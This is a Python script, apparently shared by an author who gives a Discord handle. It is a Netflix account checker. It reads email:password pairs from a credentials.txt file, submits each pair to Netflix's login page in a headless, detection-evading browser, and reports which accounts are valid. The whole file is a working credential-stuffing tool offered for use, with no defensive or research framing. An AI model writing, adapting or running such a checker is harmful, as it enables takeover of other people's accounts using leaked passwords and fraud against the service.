import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time, os
from colorama import Fore, Style, init
from pystyle import Center, Colorate, Colors, Anime
from colorama import Fore
import os

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
 /$$$$$$$  /$$$$$$$$ /$$       /$$   /$$  /$$$$$$   /$$$$$$ 
| $$__  $$| $$_____/| $$      | $$  | $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \__/| $$  \ $$
| $$$$$$$ | $$$$$   | $$      | $$  | $$| $$ /$$$$| $$$$$$$$
| $$__  $$| $$__/   | $$      | $$  | $$| $$|_  $$| $$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \ $$| $$  | $$
| $$$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$
|_______/ |________/|________/ \______/  \______/ |__/  |__/

                ┏━━━━━━━━━━━━━━━━━━━━━┓
                ┃  Author : Ego/xhe   ┃
                ┃ Discord: .gg/xxxxx  ┃
                ┗━━━━━━━━━━━━━━━━━━━━━┛
                          
"""))

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

init()

def check_credentials(email, password):
    options = uc.ChromeOptions()
    options.add_argument("--headless")  
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-dev-shm-usage")

    driver = uc.Chrome(options=options) 

    start_time = time.time()

    try:
        driver.get('https://www.netflix.com/login')

        wait = WebDriverWait(driver, 5)
        
        email_field = wait.until(EC.presence_of_element_located((By.NAME, 'userLoginId')))
        password_field = wait.until(EC.presence_of_element_located((By.NAME, 'password')))
        submit_button = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@type="submit"]')))
        
        email_field.send_keys(email)
        password_field.send_keys(password)
        submit_button.click()

        try:
            WebDriverWait(driver, 5).until(
                EC.url_contains('home') or EC.presence_of_element_located((By.XPATH, '//h1[contains(text(),"Home")]'))
            )
            valid = 'home' in driver.current_url
        except:
            valid = False

    finally:
        driver.quit()
    
    elapsed_time = time.time() - start_time
    return valid, elapsed_time

clear()
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
 /$$$$$$$  /$$$$$$$$ /$$       /$$   /$$  /$$$$$$   /$$$$$$ 
| $$__  $$| $$_____/| $$      | $$  | $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \__/| $$  \ $$
| $$$$$$$ | $$$$$   | $$      | $$  | $$| $$ /$$$$| $$$$$$$$
| $$__  $$| $$__/   | $$      | $$  | $$| $$|_  $$| $$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \ $$| $$  | $$
| $$$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$
|_______/ |________/|________/ \______/  \______/ |__/  |__/

                ┏━━━━━━━━━━━━━━━━━━━━━┓
                ┃  Author : Ego/xhe   ┃
                ┃ Discord: .gg/xxxxx  ┃
                ┗━━━━━━━━━━━━━━━━━━━━━┛
                          
"""))
input("Create credentials.txt, and write Netflix acc and press enter..")
os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
 /$$$$$$$  /$$$$$$$$ /$$       /$$   /$$  /$$$$$$   /$$$$$$ 
| $$__  $$| $$_____/| $$      | $$  | $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \__/| $$  \ $$
| $$$$$$$ | $$$$$   | $$      | $$  | $$| $$ /$$$$| $$$$$$$$
| $$__  $$| $$__/   | $$      | $$  | $$| $$|_  $$| $$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \ $$| $$  | $$
| $$$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$
|_______/ |________/|________/ \______/  \______/ |__/  |__/

                ┏━━━━━━━━━━━━━━━━━━━━━┓
                ┃  Author : Ego/xhe   ┃
                ┃ Discord: .gg/xxxxx  ┃
                ┗━━━━━━━━━━━━━━━━━━━━━┛
                          
"""))
with open('credentials.txt', 'r') as file:
    for line in file:
        email, password = line.strip().split(':')
        is_valid, time_taken = check_credentials(email, password)
        if is_valid:
            print(f'{Fore.GREEN}Valid account: {email} (Time: {time_taken:.2f} sec){Style.RESET_ALL}')
        else:
            print(f'{Fore.RED}Invalid account: {email} (Time: {time_taken:.2f} sec){Style.RESET_ALL}')
